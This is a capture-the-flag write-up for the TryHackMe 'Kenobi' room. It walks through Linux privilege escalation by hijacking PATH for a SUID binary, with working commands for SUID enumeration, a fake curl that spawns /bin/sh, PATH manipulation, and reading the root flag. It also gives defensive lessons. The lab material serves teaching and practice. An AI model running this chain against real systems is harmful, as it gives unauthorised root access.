# THM — Kenobi: SUID & PATH Hijacking

> **Platform:** TryHackMe  
> **Difficulty:** Easy/Medium  
> **OS:** Linux  
> **Tags:** `#thm` `#suid` `#path-hijacking` `#privesc` `#linux` `#enumeration`

---

## Kill Chain Summary

```
SUID Enumeration → Vulnerable Binary Discovery (/usr/bin/menu)
→ PATH Manipulation → Fake Binary Injection → Root Shell
```

---

## 1. The Concept — SUID Bit

Before diving into the exploit, it's essential to understand the underlying mechanism.

**What is SUID?**

The **SUID (Set User ID)** bit is a special Linux permission flag. Normally, when a user executes a binary, the process runs with that user's permissions. When a binary has the SUID bit set and is owned by `root`, however, the process runs with **root's privileges** regardless of who launched it.

```
-rwsr-xr-x 1 root root ... /usr/bin/menu
     ^
     └── 's' here = SUID bit active
```

**The fatal flaw — relative vs absolute paths**

Running `strings` on the SUID binary `/usr/bin/menu` reveals that internally it calls system commands using **relative paths**:

```c
// Vulnerable — relies on PATH resolution
curl

// Secure — absolute path, not hijackable
/usr/bin/curl
```

When Linux sees a command without an absolute path, it searches through the directories listed in the `$PATH` environment variable **in order**. If we control `$PATH`, we control which binary gets executed.

---

## 2. Reconnaissance — SUID Enumeration

Search for all SUID binaries on the system:

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Output (relevant entries):**

```
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/menu        ← anomalous, non-standard
...
```

Everything in the list is a standard Linux utility — except `/usr/bin/menu`, which has no business being there.

> **Answer — Q1:** What file looks particularly out of the ordinary?  
> `/usr/bin/menu`

---

## 3. Binary Analysis

Run the binary to understand its behaviour:

```bash
/usr/bin/menu
```

A menu is presented with selectable options (e.g. 1, 2, 3). Each option corresponds to a system command that the binary executes internally.

> **Answer — Q2:** How many options appear?  
> `3`

To confirm the use of relative paths, inspect the binary strings:

```bash
strings /usr/bin/menu
```

Among the output, commands like `curl`, `uname`, `ifconfig` appear without absolute paths — confirming the attack surface.

---

## 4. Privilege Escalation — PATH Hijacking

**The attack in four steps:**

1. Create a malicious binary with the same name as the command called by `/usr/bin/menu`
2. Place it in a directory we control (`/tmp`)
3. Prepend that directory to `$PATH`
4. Trigger the SUID binary — it will find and execute our fake binary as root

**Step 1 — Move to a writable directory**

```bash
cd /tmp
```

**Step 2 — Create the fake `curl` binary**

```bash
echo /bin/sh > curl
```

**Step 3 — Make it executable**

```bash
chmod 777 curl
```

**Step 4 — Hijack the PATH**

```bash
export PATH=/tmp:$PATH
```

This prepends `/tmp` to the search order. When the system looks for `curl`, it will find ours first.

**Step 5 — Trigger the vulnerable binary**

```bash
/usr/bin/menu
```

Select option **1** (the one that calls `curl` internally).

**Step 6 — Verify root access**

Instead of seeing curl output, a shell prompt appears. Confirm privileges:

```bash
whoami
# root
```

✅ Root shell obtained via SUID PATH hijacking.

---

## 5. Flag Retrieval

```bash
cat /root/root.txt
```

---

## 6. Vulnerability Summary

| # | Finding | Severity | Detail |
|---|---------|----------|--------|
| 1 | SUID binary with relative path calls | 🔴 Critical | `/usr/bin/menu` calls `curl` without absolute path — hijackable via `$PATH` |
| 2 | World-executable SUID binary | 🟡 Medium | Binary accessible to all users on the system |
| 3 | Writable `/tmp` directory | ℹ️ Info | Standard on Linux, but enables this attack chain when combined with the above |

---

## 7. Key Takeaways

- **Always use absolute paths in SUID binaries:** A SUID binary that calls commands via relative paths is a privilege escalation waiting to happen. Every internal call should use the full path (e.g. `/usr/bin/curl`, not `curl`).
- **SUID enumeration is a standard privesc step:** `find / -perm -u=s -type f 2>/dev/null` should be part of every Linux post-exploitation checklist. Anything outside standard system utilities is an immediate red flag.
- **PATH is user-controlled:** The `$PATH` variable can be freely manipulated by any user. Never trust it inside privileged contexts.
- **`strings` is underrated:** Running `strings` on an unknown binary is a fast, passive way to reveal hardcoded commands, paths, credentials, and logic — no disassembler needed.

---

## Quick Reference — Key Commands

```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Inspect binary internals
strings /usr/bin/menu

# Run the binary to enumerate options
/usr/bin/menu

# Create fake binary
cd /tmp
echo /bin/sh > curl
chmod 777 curl

# Hijack PATH
export PATH=/tmp:$PATH

# Trigger exploit
/usr/bin/menu
# → select option 1

# Verify and loot
whoami
cat /root/root.txt
```

---

*Writeup completed on 30/03/2026 — TryHackMe / Kenobi (SUID & PATH Hijacking)*
